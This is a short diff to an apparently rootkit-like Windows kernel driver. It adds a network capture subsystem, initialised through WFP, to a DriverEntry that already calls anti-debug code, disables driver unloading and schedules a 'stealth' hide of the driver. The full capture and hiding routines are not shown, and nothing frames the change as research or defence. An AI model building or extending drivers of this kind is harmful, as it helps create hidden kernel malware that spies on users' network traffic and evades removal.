@@ -6,6 +6,12 @@
 #include <function/CoreSecurity.h>
 #include <function/AntiDebug.h>
 
+// Forward declaration for network subsystem init/cleanup
+namespace net_capture {
+    NTSTATUS initialize(PDEVICE_OBJECT devObj);
+    void cleanup();
+}
+
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
     UNREFERENCED_PARAMETER(RegistryPath);
 
@@ -59,6 +65,9 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
     DriverObject->DriverUnload = nullptr;
 
     ClearFlag(deviceObject->Flags, DO_DEVICE_INITIALIZING);
+
+    // Initialize network capture subsystem (non-fatal if WFP unavailable)
+    net_capture::initialize(deviceObject);
 
     stealth::ScheduleDelayedHide(DriverObject);
 
